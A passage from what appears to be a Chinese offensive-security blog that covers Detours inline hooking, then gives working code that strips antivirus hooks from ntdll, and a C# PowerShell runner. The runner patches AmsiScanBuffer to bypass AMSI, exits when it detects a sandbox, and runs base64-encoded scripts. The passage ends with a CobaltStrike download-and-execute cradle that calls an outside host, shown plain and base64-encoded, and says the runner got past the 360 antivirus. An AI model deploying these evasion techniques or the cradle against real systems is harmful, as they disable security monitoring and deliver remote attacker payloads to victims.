提交Detour操作</span></span><br><span class="line">    <span class="built_in">DetourTransactionCommit</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用MessageBoxA，但实际上会跳转到MyFunction0</span></span><br><span class="line">    <span class="built_in">MessageBoxA</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定义一个函数指针 <code>OldMessageBoxA</code>，这个函数指针指向了<code>MessageBoxA</code>函数，同时定义了一个新的函数<code>MyFunction0</code></p>
<p><code>DetourTransactionBegin</code>来开始一个新的Detour操作，然后使用<code>DetourUpdateThread</code>来更新当前线程的状态，使得Detour操作能影响到当前线程</p>
<p><code>DetourAttach</code>函数是Detour操作的核心，这个函数会将<code>OldMessageBoxA</code>的调用重定向到<code>MyFunction0</code>，也就是说，当其他代码尝试调用<code>MessageBoxA</code>时，实际上会调用<code>MyFunction0</code></p>
<p>调用<code>DetourTransactionCommit</code>来提交Detour操作，使得之前的重定向生效。这时候，任何尝试调用<code>MessageBoxA</code>的代码，实际上都会调用<code>MyFunction0</code></p>
<p>注意，如果想要取消Detour操作，只需要使用<code>DetourDetach</code>函数，将<code>OldMessageBoxA</code>和<code>MyFunction0</code>之间的重定向取消即可</p>
<h2 id="编写Dll"><a href="#编写Dll" class="headerlink" title="编写Dll"></a>编写Dll</h2><h3 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现"></a>代码实现</h3><p>如下是通过detour库实现inlineHook的动态链接库代码:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;detours/detours.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明一个函数指针OldMessageBoxA，指向MessageBoxA函数</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="title">int</span> <span class="params">(WINAPI* OldMesssageBoxA)</span></span></span><br><span class="line"><span class="function"><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    HWND hWnd,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCSTR lpText,</span></span></span><br><span class="line"><span class="params"><span class="function">    LPCSTR lpCaption,</span></span></span><br><span class="line"><span class="params"><span class="function">    UINT uType</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span> </span>= MessageBoxA;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义函数MyFunction0，当MessageBoxA被调用时，会跳转到这个函数</span></span><br><span class="line"><span class="function"><span class="type">int</span> WINAPI <span class="title">MyFunction0</span><span class="params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 在这个函数中，调用原来的MessageBoxA函数，显示特定的信息</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">OldMesssageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;Hook Success!&quot;</span>, <span class="string">&quot;Warming&quot;</span>, MB_OKCANCEL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="comment">// 开始一次新的Detour操作</span></span><br><span class="line">    <span class="built_in">DetourTransactionBegin</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 告诉Detour这个线程将被影响</span></span><br><span class="line">    <span class="built_in">DetourUpdateThread</span>(<span class="built_in">GetCurrentThread</span>());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将OldMessageBoxA函数指针替换为MyFunction0，也就是说当MessageBoxA被调用时，跳转到MyFunction0</span></span><br><span class="line">    <span class="built_in">DetourAttach</span>(&amp;(PVOID&amp;)OldMesssageBoxA, MyFunction0);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果需要移除Hook，可以调用DetourDetach</span></span><br><span class="line">    <span class="comment">// DetourDetach(&amp;(PVOID&amp;)OldMesssageBoxA, MyFunction0);</span></span><br><span class="line">    <span class="comment">// 提交Detour操作</span></span><br><span class="line">    <span class="built_in">DetourTransactionCommit</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用MessageBoxA，但实际上会跳转到MyFunction0</span></span><br><span class="line">    <span class="comment">//MessageBoxA(0, 0, 0, 0);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">	DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">	LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> DLL_PROCESS_ATTACH: &#123;</span><br><span class="line">        HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, ThreadProc, (LPVOID)<span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">	<span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">	<span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>如下是用来测试InlineHook_dll的可执行程序代码, 在没被Hook的情况下会弹框提示”HelloWorld”, 被Hook后会弹框提示”Hook Success!”</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">LoadLibraryA</span>(<span class="string">&quot;InlineHook_dll.dll&quot;</span>);</span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">	<span class="built_in">MessageBoxA</span>(<span class="literal">NULL</span>, <span class="string">&quot;HelloWorld&quot;</span>, <span class="string">&quot;窗口标题&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h3><p>执行HookTest.exe, 按回车后出现弹框, 提示”Hook Success!”</p>
<img src="Hook攻防/动画.gif" alt="动画" style="zoom:67%;" />	



<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><a href="https://idiotc4t.com/persistence/detous-inline-hook#inline-hook-jian-jie">https://idiotc4t.com/persistence/detous-inline-hook#inline-hook-jian-jie</a></li>
</ul>
<h1 id="去除Ntdll的Hook"><a href="#去除Ntdll的Hook" class="headerlink" title="去除Ntdll的Hook"></a>去除Ntdll的Hook</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>许多杀毒软件使用钩子（hook）技术来监视系统的API函数调用，并检测潜在的恶意代码行为。Ntdll.dll是Windows操作系统的一个核心动态链接库，其中包含许多系统级API函数。通过在Ntdll上设置钩子，杀毒软件可以拦截这些API函数的调用，并检查它们的参数和返回值，以便发现可能的恶意行为</p>
<p>下图是没有被杀软挂钩子的NtCreateThread函数</p>
<p><img src="/Hook%E6%94%BB%E9%98%B2/image-20230630171325746.png" alt="image-20230630171325746"></p>
<p>下图是被BitDefender挂钩子的NtCreateThread函数，钩子是<code>jmp 7FFAACAD0264</code></p>
<p><img src="/Hook%E6%94%BB%E9%98%B2/image-20230630171710947.png" alt="image-20230630171710947"></p>
<p>​	</p>
<h2 id="代码思路"><a href="#代码思路" class="headerlink" title="代码思路"></a>代码思路</h2><p><code>UNHOOKntdll()</code>函数的主要目标是移除对<code>ntdll.dll</code>文件的任何hooks</p>
<h3 id="1-获取被挂钩的ntdll信息"><a href="#1-获取被挂钩的ntdll信息" class="headerlink" title="1.获取被挂钩的ntdll信息"></a>1.获取被挂钩的ntdll信息</h3><p>函数首先通过<code>GetModuleHandleA(&quot;ntdll.dll&quot;)</code>获取ntdll模块的句柄，这个句柄指向当前进程中已经加载的<code>ntdll.dll</code>。</p>
<p><code>GetModuleInformation()</code>被用于获取ntdll模块的信息，包括模块的基地址等。此处获取到的信息将被用于后续操作</p>
<h3 id="2-打开新的ntdll并映射至进程空间"><a href="#2-打开新的ntdll并映射至进程空间" class="headerlink" title="2.打开新的ntdll并映射至进程空间"></a>2.打开新的ntdll并映射至进程空间</h3><p>通过调用<code>CreateFileA()</code>打开系统目录下的原始<code>ntdll.dll</code>文件。这个文件没有被任何hook修改，所以可以作为一个“清洁”的源来恢复被hook修改的部分</p>
<p>使用<code>CreateFileMapping()</code>和<code>MapViewOfFile()</code>函数将原始ntdll文件映射至当前进程的地址空间中</p>
<h3 id="3-查找ntdll的text节区"><a href="#3-查找ntdll的text节区" class="headerlink" title="3.查找ntdll的text节区"></a>3.查找ntdll的text节区</h3><p>遍历当前进程中加载的ntdll模块的所有section（节区）。在Windows PE文件格式（包括DLL和EXE）中，一个section是包含特定类型数据的一个内存区块，例如代码或者数据。特别地，<code>.text</code> section通常包含程序的代码</p>
<h3 id="4-替换text节区的内容"><a href="#4-替换text节区的内容" class="headerlink" title="4.替换text节区的内容"></a>4.替换text节区的内容</h3><p>通过调用<code>VirtualProtect()</code>改变它的内存保护属性，使其成为可读、可写、可执行。这样才能修改该内存区块的内容</p>
<p>通过<code>memcpy()</code>将原始ntdll文件中的<code>.text</code> section的内容复制到当前进程的ntdll模块的对应部分。这个操作实际上就是“恢复”了被hook修改过的代码，因为现在它被原始的、没有被hook的代码所替代</p>
<h2 id="代码实现-2"><a href="#代码实现-2" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;psapi.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 智能句柄，自动管理系统资源</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">SmartHandle</span> &#123;</span><br><span class="line">    HANDLE handle; <span class="comment">// 系统句柄</span></span><br><span class="line">    <span class="built_in">SmartHandle</span>(HANDLE handle) : <span class="built_in">handle</span>(handle) &#123;&#125; <span class="comment">// 构造函数，接收系统句柄</span></span><br><span class="line">    ~<span class="built_in">SmartHandle</span>() &#123; <span class="comment">// 析构函数</span></span><br><span class="line">        <span class="keyword">if</span> (handle != INVALID_HANDLE_VALUE) &#123; <span class="comment">// 判断句柄是否有效</span></span><br><span class="line">            <span class="built_in">CloseHandle</span>(handle); <span class="comment">// 如果有效，关闭句柄</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">UNHOOKntdll</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    MODULEINFO mi = &#123;&#125;; <span class="comment">// 定义模块信息结构体</span></span><br><span class="line">    HMODULE ntdllModule = <span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>); <span class="comment">// 获取ntdll模块的句柄</span></span><br><span class="line">    <span class="built_in">GetModuleInformation</span>(<span class="built_in">HANDLE</span>(<span class="number">-1</span>), ntdllModule, &amp;mi, <span class="built_in">sizeof</span>(mi)); <span class="comment">// 获取模块信息，存放到mi</span></span><br><span class="line">    LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll; <span class="comment">// 获取ntdll模块的基址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用智能句柄打开ntdll.dll文件</span></span><br><span class="line">    <span class="function">SmartHandle <span class="title">ntdllFile</span><span class="params">(CreateFileA(<span class="string">&quot;c:\\windows\\system32\\ntdll.dll&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">        GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>))</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建文件映射，映射ntdll.dll文件</span></span><br><span class="line">    <span class="function">SmartHandle <span class="title">ntdllMapping</span><span class="params">(CreateFileMapping(ntdllFile.handle, <span class="literal">NULL</span>, PAGE_READONLY |</span></span></span><br><span class="line"><span class="params"><span class="function">        SEC_IMAGE, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>))</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 映射视图，得到映射地址</span></span><br><span class="line">    LPVOID ntdllMappingAddress = <span class="built_in">MapViewOfFile</span>(ntdllMapping.handle, FILE_MAP_READ, <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取ntdll模块的DOS头</span></span><br><span class="line">    PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取ntdll模块的NT头</span></span><br><span class="line">    PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase</span><br><span class="line">        + hookedDosHeader-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历所有节</span></span><br><span class="line">    <span class="keyword">for</span> (WORD i = <span class="number">0</span>; i &lt; hookedNtHeader-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line">        <span class="comment">// 读取每个节的头信息</span></span><br><span class="line">        PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)</span><br><span class="line">            ((DWORD_PTR)<span class="built_in">IMAGE_FIRST_SECTION</span>(hookedNtHeader) +</span><br><span class="line">                ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 检查是否是.text节</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>((<span class="type">char</span>*)hookedSectionHeader-&gt;Name, (<span class="type">char</span>*)<span class="string">&quot;.text&quot;</span>)) &#123;</span><br><span class="line">            DWORD oldProtection = <span class="number">0</span>; <span class="comment">// 用来保存旧的保护属性</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 修改内存保护属性为可读可写可执行</span></span><br><span class="line">                BOOL isProtected = <span class="built_in">VirtualProtect</span>((LPVOID)((DWORD_PTR)ntdllBase +</span><br><span class="line">                    (DWORD_PTR)hookedSectionHeader-&gt;VirtualAddress), hookedSectionHeader-&gt;Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &amp;oldProtection);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 使用memcpy替换.text节的内容</span></span><br><span class="line">                <span class="built_in">memcpy</span>((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader-&gt;VirtualAddress),</span><br><span class="line">                    (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader-&gt;VirtualAddress), hookedSectionHeader-&gt;Misc.VirtualSize);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">catch</span> (...) &#123;</span><br><span class="line">                <span class="comment">// 如果在修改过程中发生异常，确保恢复内存的保护属性</span></span><br><span class="line">                <span class="built_in">VirtualProtect</span>((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader-&gt;VirtualAddress), hookedSectionHeader-&gt;Misc.VirtualSize, oldProtection, &amp;oldProtection);</span><br><span class="line">                <span class="keyword">throw</span>; <span class="comment">// 再次抛出异常，让上层调用者知道发生了异常</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 确保我们恢复了内存的保护属性</span></span><br><span class="line">            <span class="built_in">VirtualProtect</span>((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader-&gt;VirtualAddress), hookedSectionHeader-&gt;Misc.VirtualSize, oldProtection, &amp;oldProtection);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">FreeLibrary</span>(ntdllModule); <span class="comment">// 释放模块</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="built_in">UNHOOKntdll</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="运行测试-1"><a href="#运行测试-1" class="headerlink" title="运行测试"></a>运行测试</h2><p>重载Ntdll后，可以发现杀软的钩子被去除掉了</p>
<p><img src="/Hook%E6%94%BB%E9%98%B2/image-20230630183555397.png" alt="image-20230630183555397">	</p>
<h1 id="END"><a href="#END" class="headerlink" title="END"></a>END</h1>]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/04/29/Powershell%E5%85%8D%E6%9D%80/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h1 id="分析powershell"><a href="#分析powershell" class="headerlink" title="分析powershell"></a>分析powershell</h1><p>通过查看powershell程序的模块调用，发现有一个名为<code>System.Management.Automation.ni.dll</code>，这个Dll包含PowerShell 运行时和所有在 PowerShell 环境中运行的命令</p>
<p><code>System.Management.Automation.ni.dll</code> 是预编译版本的 <code>System.Management.Automation.dll</code>，这样 PowerShell 可以更快地加载和运行</p>
<p>若想执行 PowerShell 命令或脚本的 C# 程序，都需要引用 <code>System.Management.Automation.dll</code></p>
<img src="Powershell免杀/image-20230719000833203.png" alt="image-20230719000833203" style="zoom:80%;" />



<h1 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h1><p>创建一个C#的<code>.Net Framework</code>项目，添加引用，点击浏览找到<code>System.Management.Automation.dll</code>其所在路径并勾选上</p>
<p><img src="/Powershell%E5%85%8D%E6%9D%80/image-20230719001757139.png" alt="image-20230719001757139"></p>
<p>下述代码是一个完整的PowerShell脚本执行环境，它支持接收Base64编码的PowerShell脚本作为参数，解码并执行脚本，同时如果参数中包含”-s”，那么还会执行bypass AMSI的操作。其中AMSI是Windows中用于防止恶意脚本执行的安全机制</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Management.Automation;</span><br><span class="line"><span class="keyword">using</span> System.Management.Automation.Runspaces;</span><br><span class="line"><span class="keyword">using</span> System.Collections.ObjectModel;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.InteropServices;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> MyPowershell</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 使用DllImport属性导入kernel32.dll中的GetProcAddress函数，用于获取指定模块的函数或变量的地址。</span></span><br><span class="line">        [<span class="built_in">DllImport</span>(<span class="string">&quot;kernel32&quot;</span>)]</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">extern</span> IntPtr <span class="title">GetProcAddress</span><span class="params">(IntPtr hModule, string procName)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 导入kernel32.dll中的LoadLibrary函数，用于加载指定的动态链接库，并返回库的句柄。</span></span><br><span class="line">        [<span class="built_in">DllImport</span>(<span class="string">&quot;kernel32&quot;</span>)]</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">extern</span> IntPtr <span class="title">LoadLibrary</span><span class="params">(string name)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 导入kernel32.dll中的VirtualProtect函数，用于改变指定内存区域的保护属性。</span></span><br><span class="line">        [<span class="built_in">DllImport</span>(<span class="string">&quot;kernel32&quot;</span>)]</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">extern</span> <span class="type">bool</span> <span class="title">VirtualProtect</span><span class="params">(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 用于将byte数组中的数据复制到指定的内存地址中。</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="type">static</span> <span class="type">void</span> <span class="title">copy</span><span class="params">(Byte[] Patch, IntPtr Address)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            Marshal.<span class="built_in">Copy</span>(Patch, <span class="number">0</span>, Address, <span class="number">6</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 此方法通过修改AmsiScanBuffer函数来bypass AMSI检测。</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="type">void</span> <span class="title">chaching</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// 加载amsi.dll</span></span><br><span class="line">            IntPtr Library = <span class="built_in">LoadLibrary</span>(<span class="string">&quot;a&quot;</span> + <span class="string">&quot;m&quot;</span> + <span class="string">&quot;s&quot;</span> + <span class="string">&quot;i&quot;</span> + <span class="string">&quot;.dll&quot;</span>);</span><br><span class="line">            <span class="comment">// 获取AmsiScanBuffer函数的地址</span></span><br><span class="line">            IntPtr Address = <span class="built_in">GetProcAddress</span>(Library, <span class="string">&quot;Amsi&quot;</span> + <span class="string">&quot;Scan&quot;</span> + <span class="string">&quot;Buffer&quot;</span>);</span><br><span class="line">            uint p;</span><br><span class="line">            <span class="comment">// 修改AmsiScanBuffer函数的内存保护属性</span></span><br><span class="line">            <span class="built_in">VirtualProtect</span>(Address, (UIntPtr)<span class="number">5</span>, <span class="number">0x40</span>, out p);</span><br><span class="line">            <span class="comment">// 准备新的函数字节码</span></span><br><span class="line">            Byte[] Patch = &#123; <span class="number">0xB8</span>, <span class="number">0x57</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x80</span>, <span class="number">0xC3</span> &#125;;</span><br><span class="line">            <span class="comment">// 将新的函数字节码复制到AmsiScanBuffer函数的地址</span></span><br><span class="line">            <span class="built_in">copy</span>(Patch, Address);</span><br><span class="line">            Console.<span class="built_in">WriteLine</span>(<span class="string">&quot;Patch Applied&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">Main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// 如果命令行参数为空，结束程序运行</span></span><br><span class="line">            <span class="keyword">if</span> (args.Length == <span class="number">0</span>)</span><br><span class="line">                Environment.<span class="built_in">Exit</span>(<span class="number">1</span>);</span><br><span class="line">			</span><br><span class="line">            <span class="comment">// 判断系统的进程数是否小于40，如果小于40则退出程序(用来反defender的沙箱)</span></span><br><span class="line">            <span class="keyword">if</span> (Process.<span class="built_in">GetProcesses</span>().Length &lt; <span class="number">40</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.<span class="built_in">WriteLine</span>(<span class="string">&quot;The number of processes in the system is less than 40. Exiting the program.&quot;</span>);</span><br><span class="line">                Environment.<span class="built_in">Exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            List&lt;string&gt; argsList = <span class="keyword">new</span> <span class="built_in">List</span>&lt;string&gt;(args);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果命令行参数中包含“-s”，则执行bypass amsi的操作</span></span><br><span class="line">            <span class="keyword">if</span> (argsList.<span class="built_in">Contains</span>(<span class="string">&quot;-s&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">chaching</span>();</span><br><span class="line">                argsList.<span class="built_in">Remove</span>(<span class="string">&quot;-s&quot;</span>); <span class="comment">//从参数数组中移除&quot;-s&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 对传入的Base64编码的字符串进行解码</span></span><br><span class="line">            string temp = <span class="built_in">Base64Decode</span>(argsList[<span class="number">0</span>]);</span><br><span class="line">            <span class="comment">// 运行解码后的PowerShell脚本，并将执行结果输出到控制台</span></span><br><span class="line">            string s = <span class="built_in">RunScript</span>(temp);</span><br><span class="line">            Console.<span class="built_in">WriteLine</span>(s);</span><br><span class="line">            Console.<span class="built_in">ReadKey</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Base64解码函数</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="type">static</span> string <span class="title">Base64Decode</span><span class="params">(string s)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> System.Text.Encoding.Default.<span class="built_in">GetString</span>(System.Convert.<span class="built_in">FromBase64String</span>(s));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 运行PowerShell脚本并返回执行结果的函数</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="type">static</span> string <span class="title">RunScript</span><span class="params">(string script)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// 创建并打开一个运行空间，用于运行PowerShell命令</span></span><br><span class="line">            Runspace MyRunspace = RunspaceFactory.<span class="built_in">CreateRunspace</span>();</span><br><span class="line">            MyRunspace.<span class="built_in">Open</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 在运行空间中创建一个管道，用于存放待执行的PowerShell命令</span></span><br><span class="line">            Pipeline MyPipeline = MyRunspace.<span class="built_in">CreatePipeline</span>();</span><br><span class="line">            <span class="comment">// 在管道中添加PowerShell命令</span></span><br><span class="line">            MyPipeline.Commands.<span class="built_in">AddScript</span>(script);</span><br><span class="line">            <span class="comment">// 在管道中添加输出命令，使得PowerShell命令的执行结果能被程序获取</span></span><br><span class="line">            MyPipeline.Commands.<span class="built_in">Add</span>(<span class="string">&quot;Out-String&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 调用管道中的PowerShell命令，并获取执行结果</span></span><br><span class="line">            Collection&lt;PSObject&gt; outputs = MyPipeline.<span class="built_in">Invoke</span>();</span><br><span class="line">            <span class="comment">// 关闭运行空间</span></span><br><span class="line">            MyRunspace.<span class="built_in">Close</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将执行结果转换为字符串</span></span><br><span class="line">            StringBuilder sb = <span class="keyword">new</span> <span class="built_in">StringBuilder</span>();</span><br><span class="line">            foreach (PSObject pobject in outputs)</span><br><span class="line">            &#123;</span><br><span class="line">                sb.<span class="built_in">AppendLine</span>(pobject.<span class="built_in">ToString</span>());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> sb.<span class="built_in">ToString</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​		</p>
<h1 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h1><h2 id="360核晶环境"><a href="#360核晶环境" class="headerlink" title="360核晶环境"></a>360核晶环境</h2><p>360静态查杀没有报毒</p>
<img src="Powershell免杀/image-20230719101836803.png" alt="image-20230719101836803" style="zoom:67%;" />	



<p>使用CobaltStrike生成Powershell命令, 我们只需截取以下部分作为payload即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.47.155:80/a&#x27;))</span><br></pre></td></tr></table></figure>



<p>将payload进行base64加密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SUVYICgobmV3LW9iamVjdCBuZXQud2ViY2xpZW50KS5kb3dubG9hZHN0cmluZygnaHR0cDovLzE5Mi4xNjguNDcuMTU1OjgwL2EnKSk=</span><br></pre></td></tr></table></figure>



